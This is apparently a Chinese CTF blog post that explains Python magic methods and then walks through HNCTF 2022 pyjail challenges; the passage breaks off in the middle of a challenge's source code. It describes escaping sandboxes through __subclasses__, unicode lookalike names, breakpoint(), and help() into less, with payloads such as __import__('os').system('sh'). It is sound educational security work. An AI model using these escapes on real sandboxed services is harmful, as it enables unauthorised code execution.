&lt;p&gt;如 &lt;code&gt;bytes.fromhex&lt;/code&gt; 、 &lt;code&gt;int.from_bytes&lt;/code&gt;  等。对于这些类的实例，也能调用这些静态方法。如 &lt;code&gt;b&#39;1&#39;.fromhex(&#39;1234&#39;)&lt;/code&gt; ，返回 &lt;code&gt;b&#39;\x124&#39;&lt;/code&gt; 。（一个特殊的例子是整数常量不支持这样操作，如输入 &lt;code&gt;3.from_bytes&lt;/code&gt;  会报错）&lt;/p&gt;
&lt;h3 id=&#34;python魔术方法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#python魔术方法&#34;&gt;#&lt;/a&gt; Python 魔术方法&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;__init__&lt;/code&gt; ：构造函数。这个在实例化类的时候就会用到，一般是接受类初始化的参数，并且进行一系列初始化操作。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;__len__&lt;/code&gt; ：返回对象的长度。对一个对象 &lt;code&gt;a&lt;/code&gt;  使用 &lt;code&gt;len(a)&lt;/code&gt;  时，会尝试调用 &lt;code&gt;a.__len__()&lt;/code&gt; 。例如要通过继承 &lt;code&gt;torch.utils.data.Dataset&lt;/code&gt;  来实现自己的数据集时，就需要实现这个方法；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;__str__&lt;/code&gt; ：返回对象的字符串表示。对一个对象 &lt;code&gt;a&lt;/code&gt;  使用 &lt;code&gt;str(a)&lt;/code&gt;  时，会尝试调用 &lt;code&gt;a.__str__()&lt;/code&gt; 。这在我们自己实现一些类，譬如复数、二叉树、有限域、椭圆曲线等时，通过实现该方法，能将对象的内容较好地打印出来。（ &lt;code&gt;print&lt;/code&gt;  函数中也会自动调用对象的 &lt;code&gt;__str__&lt;/code&gt; 方法）相似地，还有 &lt;code&gt;__int__&lt;/code&gt; 魔术方法也用于类型转换，不过较少使用；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;__getitem__&lt;/code&gt; ：根据索引返回对象的某个元素。对一个对象 &lt;code&gt;a&lt;/code&gt;  使用 &lt;code&gt;a[1]&lt;/code&gt;  时，会尝试调用 &lt;code&gt;a.__getitem__(1)&lt;/code&gt; 。同样，当我们通过继承 &lt;code&gt;torch.utils.data.Dataset&lt;/code&gt;  来实现自己的数据集时，就需要实现这个方法。有 &lt;code&gt;__getitem__&lt;/code&gt; ，自然也有对应的 &lt;code&gt;__setitem__&lt;/code&gt; ；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;__add__&lt;/code&gt; 、 &lt;code&gt;__sub__&lt;/code&gt; 、 &lt;code&gt;__mul__&lt;/code&gt; 、 &lt;code&gt;__div__&lt;/code&gt; 、 &lt;code&gt;__mod__&lt;/code&gt; ：算术运算，加减乘除模。如对一个对象 &lt;code&gt;a&lt;/code&gt;  使用 &lt;code&gt;a+b&lt;/code&gt;  时，会尝试调用 &lt;code&gt;a.__add__(b)&lt;/code&gt; 。相应地，对于有些运算，对象需放在后面（第二个操作数）的，则需实现 &lt;code&gt;__radd__&lt;/code&gt; 、 &lt;code&gt;__rsub__&lt;/code&gt; 、 &lt;code&gt;__rmul__&lt;/code&gt; 、 &lt;code&gt;__rdiv__&lt;/code&gt; 、 &lt;code&gt;__rmod__&lt;/code&gt; ，如椭圆曲线上的点的倍点运算 &lt;code&gt;G -&amp;gt; d * G&lt;/code&gt; ，就可以通过实现 &lt;code&gt;__rmul__&lt;/code&gt; 来实现。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;__and__&lt;/code&gt; ， &lt;code&gt;__or__&lt;/code&gt; 、 &lt;code&gt;__xor__&lt;/code&gt; ：逻辑运算，和算术运算类似；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;__eq__&lt;/code&gt; ， &lt;code&gt;__ne__&lt;/code&gt; 、 &lt;code&gt;__lt__&lt;/code&gt; 、 &lt;code&gt;__gt__&lt;/code&gt; 、 &lt;code&gt;__le__&lt;/code&gt; 、 &lt;code&gt;__ge__&lt;/code&gt; ：比较运算，和算术运算类似；例如 &lt;code&gt;&#39;贵州&#39; &amp;gt; &#39;广西&#39;&lt;/code&gt; ，就会转而调用 &lt;code&gt;&#39;贵州&#39;.__gt__(&#39;广西&#39;)&lt;/code&gt; ；按顺序分别是 &lt;code&gt;==&lt;/code&gt; , &lt;code&gt;!=&lt;/code&gt; , &lt;code&gt;&amp;lt;&lt;/code&gt; , &lt;code&gt;&amp;gt;&lt;/code&gt; , &lt;code&gt;&amp;lt;=&lt;/code&gt; , &lt;code&gt;&amp;gt;=&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;__getattr__&lt;/code&gt; ：访问一个不存在的属性时触发。如果我们对对象 &lt;code&gt;a&lt;/code&gt;  所对应的类实现了该方法，那么在调用未实现的 &lt;code&gt;a.b&lt;/code&gt;  时，就会转而调用 &lt;code&gt;a.__getattr__(b)&lt;/code&gt; 。这也等价于用函数的方法调用： &lt;code&gt;getattr(a, &#39;b&#39;)&lt;/code&gt; 。有 &lt;code&gt;__getattr__&lt;/code&gt; ，自然也有对应的 &lt;code&gt;__setattr__&lt;/code&gt; ；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;__setattr__&lt;/code&gt; ：在对一个属性设置值的时候，会调用到这个函数&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;__subclasses__&lt;/code&gt; ：返回当前类的所有子类。一般是用在 &lt;code&gt;object&lt;/code&gt;  类中，在 &lt;code&gt;object.__subclasses__()&lt;/code&gt;  中，我们可以找到 &lt;code&gt;os&lt;/code&gt;  模块中的类，然后再找到 &lt;code&gt;os&lt;/code&gt; ，并且执行 &lt;code&gt;os.system&lt;/code&gt; ，实现 RCE。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;相对应地，python 的类中也包含着一些魔术属性：&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;__dict__&lt;/code&gt; ：可以查看内部所有属性名和属性值组成的字典。譬如下面这段代码：&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;KFCCrazyThursday&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    vivo = &lt;span class=&#34;number&#34;&gt;50&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(KFCCrazyThursday.__dict__)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;就能看到字典中包含 &lt;code&gt;&#39;vivo&#39;: 50&lt;/code&gt;  的键值对。注意在 python 中， &lt;code&gt;dict()&lt;/code&gt;  是将类转成字典的函数，跟此魔术属性无关。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;__doc__&lt;/code&gt; ：类的帮助文档。默认类均有帮助文档。对于自定义的类，需要我们自己实现。&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;KFCCrazyThursday&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    And you broke up for seven years, you still can affect my mood, I still keep our photo, remember your birthday, OK? I have countless times to find your impulse, But still hold back, this message I do not block you, because I am your forever blacklist, but I love you, from the past to the present, a full love of you for eight years, But now I&amp;#x27;m not sad, because I have no idea who wrote this or who this girl is, and I just want to tell you by the way: Today is Crazy Thursday, I want to eat KFC&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    &amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    vivo = &lt;span class=&#34;number&#34;&gt;50&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(KFCCrazyThursday.__doc__)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;就会打印上面的文档；&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;__class__&lt;/code&gt; ：返回当前对象所属的类。如 &lt;code&gt;&#39;&#39;.__class__&lt;/code&gt; 会返回 &lt;code&gt;&amp;lt;class &#39;str&#39;&amp;gt;&lt;/code&gt; 。拿到类之后，就可以通过构造函数生成新的对象，如 &lt;code&gt;&#39;&#39;.__class__(4396)&lt;/code&gt; ，就等价于 &lt;code&gt;str(4396)&lt;/code&gt; ，即 &lt;code&gt;&#39;4396&#39;&lt;/code&gt; ；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;__base__&lt;/code&gt; ：返回当前类的基类。如 &lt;code&gt;str.__base__&lt;/code&gt; 会返回 &lt;code&gt;&amp;lt;class &#39;object&#39;&amp;gt;&lt;/code&gt; ；&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;一些重要的内置函数和变量&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#一些重要的内置函数和变量&#34;&gt;#&lt;/a&gt; 一些重要的内置函数和变量：&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;dir&lt;/code&gt; ：查看对象的所有属性和方法。在我们没有思路的时候，可以通过该函数查看所有可以利用的方法；此外，在题目禁用引号以及小数点时，也可以先用拿到类所有可用方法，再索引到方法名，并且通过 &lt;code&gt;getattr&lt;/code&gt;  来拿到目标方法。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;chr&lt;/code&gt; 、 &lt;code&gt;ord&lt;/code&gt; ：字符与 ASCII 码转换函数，能帮我们绕过一些 WAF&lt;/li&gt;
&lt;li&gt;&lt;code&gt;globals&lt;/code&gt; ：返回所有全局变量的函数；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;locals&lt;/code&gt; ：返回所有局部变量的函数；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;__import__&lt;/code&gt; ：载入模块的函数。例如 &lt;code&gt;import os&lt;/code&gt;  等价于 &lt;code&gt;os = __import__(&#39;os&#39;)&lt;/code&gt; ；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;__name__&lt;/code&gt; ：该变量指示当前运行环境位于哪个模块中。如我们 python 一般写的 &lt;code&gt;if __name__ == &#39;__main__&#39;:&lt;/code&gt; ，就是来判断是否是直接运行该脚本。如果是从另外的地方 import 的该脚本的话，那 &lt;code&gt;__name__&lt;/code&gt; 就不为 &lt;code&gt;__main__&lt;/code&gt; ，就不会执行之后的代码。更多参考&lt;a class=&#34;link&#34; href=&#34;https://link.zhihu.com/?target=https%3A//www.geeksforgeeks.org/__name__-a-special-variable-in-python/&#34;&gt;这里 &lt;i class=&#34;fa-regular fa-arrow-up-right-from-square fa-sm&#34;&gt;&lt;/i&gt;&lt;/a&gt;；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;__builtins__&lt;/code&gt; ：包含当前运行环境中默认的所有函数与类。如上面所介绍的所有默认函数，如 &lt;code&gt;str&lt;/code&gt; 、 &lt;code&gt;chr&lt;/code&gt; 、 &lt;code&gt;ord&lt;/code&gt; 、 &lt;code&gt;dict&lt;/code&gt; 、 &lt;code&gt;dir&lt;/code&gt;  等。在 pyjail 的沙箱中，往往 &lt;code&gt;__builtins__&lt;/code&gt; 被置为 &lt;code&gt;None&lt;/code&gt; ，因此我们不能利用上述的函数。所以一种思路就是我们可以先通过类的基类和子类拿到 &lt;code&gt;__builtins__&lt;/code&gt; ，再 &lt;code&gt;__import__(&#39;os&#39;).system(&#39;sh&#39;)&lt;/code&gt;  进行 RCE；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;__file__&lt;/code&gt; ：该变量指示当前运行代码所在路径。如 &lt;code&gt;open(__file__).read()&lt;/code&gt;  就是读取当前运行的 python 文件代码。需要注意的是，&lt;strong&gt;该变量仅在运行代码文件时会产生，在运行交互式终端时不会有此变量&lt;/strong&gt;；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;_&lt;/code&gt; ：该变量返回上一次运行的 python 语句结果。需要注意的是，&lt;strong&gt;该变量仅在运行交互式终端时会产生，在运行代码文件时不会有此变量&lt;/strong&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;hnctf-2022-jail&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hnctf-2022-jail&#34;&gt;#&lt;/a&gt; HNCTF 2022 Jail&lt;/h2&gt;
&lt;h3 id=&#34;calc_jail_beginner&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#calc_jail_beginner&#34;&gt;#&lt;/a&gt; calc_jail_beginner&lt;/h3&gt;
&lt;p&gt;源码&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://img2.imgtp.com/2024/05/07/krREqKi1.png&#34; alt=&#34;1715085559866.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;注释写着答案&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://img2.imgtp.com/2024/05/07/DCydnhAo.png&#34; alt=&#34;1715079686139.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;calc_jail_beginner_level1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#calc_jail_beginner_level1&#34;&gt;#&lt;/a&gt; calc_jail_beginner_level1&lt;/h3&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://img2.imgtp.com/2024/05/07/IQ2CmUzY.png&#34; alt=&#34;1715085567940.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;经过试错可以发现时 &lt;code&gt;flag&lt;/code&gt;  字符被过滤了，可以使用 &lt;code&gt;chr()&lt;/code&gt;  绕过&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://img2.imgtp.com/2024/05/07/pZ9UlBeb.png&#34; alt=&#34;1715085345824.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;calc_jail_beginner_level2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#calc_jail_beginner_level2&#34;&gt;#&lt;/a&gt; calc_jail_beginner_level2&lt;/h3&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://img2.imgtp.com/2024/05/07/8sOZtPla.png&#34; alt=&#34;1715085670839.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;长度限制 13 个字符&lt;/p&gt;
&lt;p&gt;&lt;code&gt;eval(input())&lt;/code&gt;  就不会限制长度了&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/05/07/yH3VnYJMhdu9KDz.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;calc_jail_beginner_level25&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#calc_jail_beginner_level25&#34;&gt;#&lt;/a&gt; calc_jail_beginner_level2.5&lt;/h3&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/05/07/qd2CRjgS5LtiFXu.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;试错之后发现 ban 了 &lt;code&gt;eval,input,exec&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;可以使用 unicode 注入   &lt;code&gt;𝓮val(inp𝓾t())&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/05/07/N4H5DVwTt1u6MxP.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;也可以用 &lt;code&gt;breakpoint()&lt;/code&gt; , 一个调试函数，执行后可以执行一些命令不被绕过&lt;/p&gt;
&lt;h3 id=&#34;calc_jail_beginner_level3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#calc_jail_beginner_level3&#34;&gt;#&lt;/a&gt; calc_jail_beginner_level3&lt;/h3&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/05/07/Q2eFRdN1KWETXDx.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;限制只有 7 个字符&lt;/p&gt;
&lt;p&gt;1、输入：help ()，这里字符串长度只有 6，会进入正常调用 eval 函数；&lt;/p&gt;
&lt;p&gt;2、进入 help 交互式，然后输入任意一个模块名获得该模块的帮助文档，如 sys；&lt;/p&gt;
&lt;p&gt;3、在 Linux 中，这里呈现帮助文档时，实际上是调用了系统里的 less 或 more 命令，可以利用这俩个命令执行本地命令的特性来获取一个 shell，继续按 #!，再执行外部命令 sh 即可。&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/05/07/otudEJ38IMCNkge.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/05/07/U39Xhjc4THxE8nl.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;python2-input&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#python2-input&#34;&gt;#&lt;/a&gt; python2 input&lt;/h3&gt;
&lt;p&gt;这是一个 python2 的 jail&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/05/07/Z4FIetBKj6Q7yzR.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;因为上面提到的在 python2 类中默认不继承 object 类，需要构造 &lt;code&gt;import&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/05/07/jcY48uqdnxaOB7L.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;lake-lake-lake&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#lake-lake-lake&#34;&gt;#&lt;/a&gt; lake lake lake&lt;/h3&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#it seems have a backdoor&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#can u find the key of it and use the backdoor&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_key_var_in_the_local_but_real_in_the_remote = &lt;span class=&#34;string&#34;&gt;&amp;quot;[DELETED]&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;func&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    code = &lt;span class=&#34;built_in&#34;&gt;input&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;gt;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(code)&amp;gt;&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;):  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;you&amp;#x27;re hacker!&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;(code))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;except&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;pass&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;backdoor&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Please enter the admin key&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    key = &lt;span class=&#34;built_in&#34;&gt;input&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;gt;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(key == fake_key_var_in_the_local_but_real_in_the_remote):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        code = &lt;span class=&#34;built_in&#34;&gt;input&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;gt;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;(code))&lt;/span&gt;&lt;br&gt;&lt;span 